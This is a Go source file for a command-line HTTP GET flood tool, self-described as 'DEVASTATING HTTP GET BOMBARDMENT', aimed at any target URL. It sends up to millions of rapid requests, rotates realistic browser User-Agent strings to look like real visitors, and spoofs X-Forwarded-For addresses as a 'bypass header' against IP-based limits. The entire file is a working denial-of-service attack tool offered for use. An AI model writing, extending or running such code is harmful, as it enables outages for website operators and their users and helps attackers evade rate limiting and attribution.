package main

import (
	"crypto/rand"
	"crypto/tls"
	"flag"
	"fmt"
	"math/big"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

// Enhanced statistics tracking
type Stats struct {
	RequestsSent       uint64
	SuccessfulRequests uint64
	FailedRequests     uint64
	BytesSent          uint64
	ConnectionErrors   uint64
	TimeoutErrors      uint64
	HTTPErrors         uint64
	TotalLatency       uint64
	MinLatency         uint64
	MaxLatency         uint64
}

// Ultra-efficient configuration
type Config struct {
	URL            string
	RequestCount   uint64
	Timeout        time.Duration
	UserAgentMode  string
	RefererMode    string
}

// User Agent Generator structure
type UserAgentGenerator struct {
	browsers         []BrowserTemplate
	operatingSystems []OSTemplate
	devices          []DeviceTemplate
	engines          []EngineTemplate
	platforms        []PlatformTemplate
	mu               sync.RWMutex
}

type BrowserTemplate struct {
	Name     string
	Versions []string
	Market   float64
}

type OSTemplate struct {
	Name     string
	Versions []string
	Arch     []string
	Market   float64
}

type DeviceTemplate struct {
	Type    string
	Models  []string
	Market  float64
}

type EngineTemplate struct {
	Name     string
	Versions []string
}

type PlatformTemplate struct {
	Name      string
	Versions  []string
	Languages []string
}

// IP Pool for advanced spoofing
type IPPool struct {
	IPv4Ranges []string
	IPv6Ranges []string
	mu         sync.RWMutex
}





// Global variables
var (
	stats            Stats
	config           Config
	uaGenerator      *UserAgentGenerator
	ipPool           *IPPool
	referers         []string
	charset          = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	targetURL        *url.URL
	startTime        time.Time
	httpClient       *http.Client
	printMutex       sync.Mutex
	randomSource     = mathrand.NewSource(time.Now().UnixNano())
	random           = mathrand.New(randomSource)
)

// Initialize advanced user agent generator
func initUserAgentGenerator() {
	uaGenerator = &UserAgentGenerator{
		browsers: []BrowserTemplate{
			{Name: "Chrome", Versions: generateVersions("120", "127", 4), Market: 65.0},
			{Name: "Firefox", Versions: generateVersions("118", "123", 2), Market: 12.0},
			{Name: "Safari", Versions: generateVersions("16", "17", 1), Market: 18.0},
			{Name: "Edge", Versions: generateVersions("118", "123", 3), Market: 4.0},
			{Name: "Opera", Versions: generateVersions("104", "109", 2), Market: 1.0},
		},
		operatingSystems: []OSTemplate{
			{Name: "Windows NT", Versions: []string{"10.0", "11.0"}, Arch: []string{"Win64; x64", "WOW64"}, Market: 72.0},
			{Name: "Macintosh", Versions: []string{"Intel Mac OS X 10_15_7", "Intel Mac OS X 11_7_10", "Intel Mac OS X 12_7_2", "Intel Mac OS X 13_6_3", "Intel Mac OS X 14_2_1"}, Arch: []string{""}, Market: 15.0},
			{Name: "X11", Versions: []string{"Linux x86_64", "Linux i686", "Ubuntu", "Fedora"}, Arch: []string{""}, Market: 4.0},
			{Name: "Android", Versions: generateVersions("10", "14", 1), Arch: []string{""}, Market: 7.0},
			{Name: "iPhone", Versions: generateVersions("15", "17", 1), Arch: []string{""}, Market: 2.0},
		},
		devices: []DeviceTemplate{
			{Type: "Desktop", Models: []string{""}, Market: 60.0},
			{Type: "Mobile", Models: []string{"SM-G998B", "Pixel 8", "iPhone15,2", "SM-A525F"}, Market: 35.0},
			{Type: "Tablet", Models: []string{"iPad13,1", "SM-T870"}, Market: 5.0},
		},
		engines: []EngineTemplate{
			{Name: "Blink", Versions: generateVersions("537", "540", 1)},
			{Name: "Gecko", Versions: generateVersions("20100101", "20100101", 0)},
			{Name: "WebKit", Versions: generateVersions("605", "608", 1)},
		},
		platforms: []PlatformTemplate{
			{Name: "X11", Versions: []string{"Linux x86_64"}, Languages: []string{"en-US", "en-GB", "de-DE", "fr-FR"}},
			{Name: "Windows", Versions: []string{"Windows NT 10.0"}, Languages: []string{"en-US", "en-GB", "de-DE", "fr-FR"}},
			{Name: "Macintosh", Versions: []string{"Intel Mac OS X 10_15_7"}, Languages: []string{"en-US", "en-GB"}},
		},
	}
}

// Generate version ranges
func generateVersions(start, end string, increment int) []string {
	startNum, _ := strconv.Atoi(start)
	endNum, _ := strconv.Atoi(end)
	var versions []string
	
	for i := startNum; i <= endNum; i += increment {
		for j := 0; j < 10; j++ {
			for k := 0; k < 100; k += 10 {
				versions = append(versions, fmt.Sprintf("%d.%d.%d", i, j, k))
			}
		}
	}
	return versions
}

// Generate realistic user agent
func (ua *UserAgentGenerator) GenerateUserAgent() string {
	ua.mu.RLock()
	defer ua.mu.RUnlock()

	// Select browser based on market share
	browser := ua.selectBrowser()
	os := ua.selectOS()
	device := ua.selectDevice()

	switch browser.Name {
	case "Chrome":
		return ua.generateChromeUA(browser, os, device)
	case "Firefox":
		return ua.generateFirefoxUA(browser, os, device)
	case "Safari":
		return ua.generateSafariUA(browser, os, device)
	case "Edge":
		return ua.generateEdgeUA(browser, os, device)
	case "Opera":
		return ua.generateOperaUA(browser, os, device)
	default:
		return ua.generateChromeUA(browser, os, device)
	}
}

func (ua *UserAgentGenerator) selectBrowser() BrowserTemplate {
	total := 0.0
	for _, item := range ua.browsers {
		total += item.Market
	}
	r := random.Float64() * total
	current := 0.0
	for _, item := range ua.browsers {
		current += item.Market
		if r <= current {
			return item
		}
	}
	return ua.browsers[0]
}

func (ua *UserAgentGenerator) selectOS() OSTemplate {
	total := 0.0
	for _, item := range ua.operatingSystems {
		total += item.Market
	}
	r := random.Float64() * total
	current := 0.0
	for _, item := range ua.operatingSystems {
		current += item.Market
		if r <= current {
			return item
		}
	}
	return ua.operatingSystems[0]
}

func (ua *UserAgentGenerator) selectDevice() DeviceTemplate {
	total := 0.0
	for _, item := range ua.devices {
		total += item.Market
	}
	r := random.Float64() * total
	current := 0.0
	for _, item := range ua.devices {
		current += item.Market
		if r <= current {
			return item
		}
	}
	return ua.devices[0]
}

func (ua *UserAgentGenerator) generateChromeUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
	version := browser.Versions[random.Intn(len(browser.Versions))]
	osVersion := os.Versions[random.Intn(len(os.Versions))]
	webkitVersion := "537.36"
	
	if os.Name == "Windows NT" {
		arch := os.Arch[random.Intn(len(os.Arch))]
		return fmt.Sprintf("Mozilla/5.0 (%s %s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
			os.Name, osVersion, arch, webkitVersion, version, webkitVersion)
	} else if os.Name == "Macintosh" {
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
			os.Name, osVersion, webkitVersion, version, webkitVersion)
	} else if os.Name == "X11" {
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
			os.Name, osVersion, webkitVersion, version, webkitVersion)
	}
	
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", version)
}

func (ua *UserAgentGenerator) generateFirefoxUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
	version := browser.Versions[random.Intn(len(browser.Versions))]
	osVersion := os.Versions[random.Intn(len(os.Versions))]
	
	if os.Name == "Windows NT" {
		arch := os.Arch[random.Intn(len(os.Arch))]
		return fmt.Sprintf("Mozilla/5.0 (%s %s; %s; rv:%s) Gecko/20100101 Firefox/%s",
			os.Name, osVersion, arch, version, version)
	} else if os.Name == "Macintosh" {
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) Gecko/20100101 Firefox/%s",
			os.Name, osVersion, version)
	} else if os.Name == "X11" {
		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s",
			os.Name, osVersion, version, version)
	}
	
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%s) Gecko/20100101 Firefox/%s", version, version)
}

func (ua *UserAgentGenerator) generateSafariUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
	version := browser.Versions[random.Intn(len(browser.Versions))]
	osVersion := os.Versions[random.Intn(len(os.Versions))]
	webkitVersion := fmt.Sprintf("605.1.%d", 10+random.Intn(20))
	
	return fmt.Sprintf("Mozilla/5.0 (Macintosh; %s) AppleWebKit/%s (KHTML, like Gecko) Version/%s Safari/%s",
		osVersion, webkitVersion, version, webkitVersion)
}

func (ua *UserAgentGenerator) generateEdgeUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
	version := browser.Versions[random.Intn(len(browser.Versions))]
	osVersion := os.Versions[random.Intn(len(os.Versions))]
	
	return fmt.Sprintf("Mozilla/5.0 (Windows NT %s; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s",
		osVersion, version, version)
}

func (ua *UserAgentGenerator) generateOperaUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
	version := browser.Versions[random.Intn(len(browser.Versions))]
	chromeVersion := fmt.Sprintf("%d.0.0.0", 100+random.Intn(30))
	
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 OPR/%s",
		chromeVersion, version)
}

// Initialize IP pool for advanced spoofing
func initIPPool() {
	ipPool = &IPPool{
		IPv4Ranges: []string{
			"1.0.0.0/8", "2.0.0.0/8", "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8",
			"8.0.0.0/8", "9.0.0.0/8", "11.0.0.0/8", "12.0.0.0/8", "13.0.0.0/8",
			"15.0.0.0/8", "16.0.0.0/8", "17.0.0.0/8", "18.0.0.0/8", "19.0.0.0/8",
			"20.0.0.0/8", "21.0.0.0/8", "22.0.0.0/8", "23.0.0.0/8", "24.0.0.0/8",
		},
		IPv6Ranges: []string{
			"2001:db8::/32", "2001::/16", "2002::/16", "2003::/16",
		},
	}
}

// Generate random IP from ranges
func (ip *IPPool) GenerateRandomIPv4() string {
	ip.mu.RLock()
	defer ip.mu.RUnlock()
	
	return fmt.Sprintf("%d.%d.%d.%d", 
		1+random.Intn(254), 
		random.Intn(256), 
		random.Intn(256), 
		1+random.Intn(254))
}

func (ip *IPPool) GenerateRandomIPv6() string {
	ip.mu.RLock()
	defer ip.mu.RUnlock()
	
	return fmt.Sprintf("2001:db8:%x:%x:%x:%x:%x:%x",
		random.Intn(65536), random.Intn(65536), random.Intn(65536), random.Intn(65536),
		random.Intn(65536), random.Intn(65536), random.Intn(65536), random.Intn(65536))
}

// Initialize minimal referers
func initAdvancedReferers() {
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.instagram.com/",
	}
}

// Initialize single ultra-efficient HTTP client
func initHTTPClient() {
	httpClient = createOptimizedClient()
}

// Create ultra-minimal HTTP client for devastating impact
func createOptimizedClient() *http.Client {
	// Minimal TLS config for speed
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Ultra-fast dialer
	dialer := &net.Dialer{
		Timeout:   1 * time.Second,
		KeepAlive: 5 * time.Second,
		DualStack: false, // IPv4 only for speed
	}

	// Minimal transport for maximum speed
	transport := &http.Transport{
		DialContext:                dialer.DialContext,
		MaxIdleConns:               1, // Single connection reuse
		MaxIdleConnsPerHost:        1, // Minimal resource usage
		MaxConnsPerHost:            1, // Single connection
		IdleConnTimeout:            5 * time.Second,
		TLSHandshakeTimeout:        1 * time.Second,
		ExpectContinueTimeout:      100 * time.Millisecond,
		ResponseHeaderTimeout:      2 * time.Second,
		DisableKeepAlives:          false,
		DisableCompression:         true, // Disable for speed
		ForceAttemptHTTP2:          false, // HTTP/1.1 only
		TLSClientConfig:            tlsConfig,
		WriteBufferSize:            4 * 1024, // Minimal buffer
		ReadBufferSize:             4 * 1024, // Minimal buffer
	}

	return &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second, // Fast timeout
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // No redirects for speed
		},
	}
}



// Generate random string
func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[random.Intn(len(charset))]
	}
	return string(b)
}

// Generate cryptographically secure random string
func secureRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[num.Int64()]
	}
	return string(b)
}



// Create ultra-minimal request for devastating impact
func createMinimalRequest() (*http.Request, error) {
	// Direct request creation - no URL modification for speed
	req, err := http.NewRequest("GET", config.URL, nil)
	if err != nil {
		return nil, err
	}

	// Minimal headers for maximum speed and devastating impact
	req.Header.Set("User-Agent", uaGenerator.GenerateUserAgent())
	req.Header.Set("Connection", "keep-alive")
	
	// Single effective bypass header (lightweight but impactful)
	if random.Intn(2) == 0 { // 50% chance
		req.Header.Set("X-Forwarded-For", ipPool.GenerateRandomIPv4())
	}

	return req, nil
}

// Ultra-efficient request engine for devastating impact
func executeRequestBombardment() {
	fmt.Printf("Launching devastating bombardment...\n")
	
	for i := uint64(0); i < config.RequestCount; i++ {
		// Create minimal request
		req, err := createMinimalRequest()
		if err != nil {
			atomic.AddUint64(&stats.FailedRequests, 1)
			continue
		}

		// Fire request with minimal processing
		resp, err := httpClient.Do(req)
		atomic.AddUint64(&stats.RequestsSent, 1)

		if err != nil {
			atomic.AddUint64(&stats.FailedRequests, 1)
		} else {
			atomic.AddUint64(&stats.SuccessfulRequests, 1)
			// Immediately discard response for speed
			if resp.Body != nil {
				resp.Body.Close()
			}
		}

		// Minimal delay for ultra-low resource usage
		if i%1000 == 0 { // Every 1000 requests
			time.Sleep(time.Microsecond * 100) // 0.1ms pause
		}
	}
}

// Ultra-minimal progress display
func printProgress() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		elapsed := time.Since(startTime)
		requestsSent := atomic.LoadUint64(&stats.RequestsSent)
		successful := atomic.LoadUint64(&stats.SuccessfulRequests)
		failed := atomic.LoadUint64(&stats.FailedRequests)

		if requestsSent >= config.RequestCount {
			break
		}

		// Calculate progress and speed
		progress := float64(requestsSent) / float64(config.RequestCount) * 100
		rps := float64(requestsSent) / elapsed.Seconds()
		
		printMutex.Lock()
		fmt.Printf("\rProgress: %.1f%% | RPS: %.0f | Sent: %d/%d | Success: %d | Failed: %d",
			progress, rps, requestsSent, config.RequestCount, successful, failed)
		printMutex.Unlock()
		
		time.Sleep(2 * time.Second)
	}
}

// Parse command line flags
func parseFlags() {
	flag.StringVar(&config.URL, "url", "", "Target URL (required)")
	flag.Uint64Var(&config.RequestCount, "count", 100000, "Number of requests to send")

	flag.Parse()

	if config.URL == "" {
		fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
		fmt.Println("║                    DEVASTATING HTTP GET BOMBARDMENT v3.0                    ║")
		fmt.Println("║                    Ultra-Low Resource | Maximum Impact                      ║")
		fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
		fmt.Println()
		fmt.Println("Usage: go run main.go -url <target> [options]")
		fmt.Println()
		fmt.Println("Required:")
		fmt.Println("  -url string     Target URL to bombard")
		fmt.Println()
		fmt.Println("Optional:")
		fmt.Println("  -count uint64   Number of requests to send (default: 100000)")
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  go run main.go -url https://target.com")
		fmt.Println("  go run main.go -url https://target.com -count 1000000")
		fmt.Println("  go run main.go -url https://target.com -count 100000000")
		fmt.Println()
		os.Exit(1)
	}

	// Set ultra-minimal configuration for maximum speed
	config.Timeout = 3 * time.Second
	config.UserAgentMode = "random"
	config.RefererMode = "random"

	targetURL, err := url.Parse(config.URL)
	if err != nil {
		fmt.Printf("Error parsing URL: %v\n", err)
		os.Exit(1)
	}
	_ = targetURL
}

// Format duration
func formatDuration(d time.Duration) string {
	totalSeconds := int(d.Seconds())
	minutes := totalSeconds / 60
	seconds := totalSeconds % 60
	return fmt.Sprintf("%02d:%02d", minutes, seconds)
}

func main() {
	parseFlags()

	// Initialize minimal components
	initUserAgentGenerator()
	initIPPool()
	initAdvancedReferers()
	initHTTPClient()

	startTime = time.Now()

	// Print devastating banner
	fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
	fmt.Println("║                    DEVASTATING HTTP GET BOMBARDMENT v3.0                    ║")
	fmt.Println("║                    Ultra-Low Resource | Maximum Impact                      ║")
	fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
	fmt.Printf("Target: %s\n", config.URL)
	fmt.Printf("Request Count: %d\n", config.RequestCount)
	fmt.Printf("Features: Ultra-Minimal Resource | Single Connection | Maximum Speed | Devastating Impact\n")

	// Start progress monitor
	go printProgress()

	// Execute devastating bombardment
	executeRequestBombardment()

	// Final statistics
	elapsed := time.Since(startTime)
	requestsSent := atomic.LoadUint64(&stats.RequestsSent)
	successful := atomic.LoadUint64(&stats.SuccessfulRequests)
	failed := atomic.LoadUint64(&stats.FailedRequests)

	rps := float64(requestsSent) / elapsed.Seconds()
	successRate := 0.0
	if requestsSent > 0 {
		successRate = float64(successful) / float64(requestsSent) * 100
	}

	fmt.Println("\n\n╔══════════════════════════════════════════════════════════════════════════════╗")
	fmt.Println("║                           BOMBARDMENT COMPLETED                             ║")
	fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
	fmt.Printf("Duration: %s\n", elapsed)
	fmt.Printf("Total Requests: %d\n", requestsSent)
	fmt.Printf("Successful: %d (%.2f%%)\n", successful, successRate)
	fmt.Printf("Failed: %d\n", failed)
	fmt.Printf("Average RPS: %.2f\n", rps)
	fmt.Printf("Impact: DEVASTATING - Server received %d rapid requests with minimal resource usage!\n", successful)
}
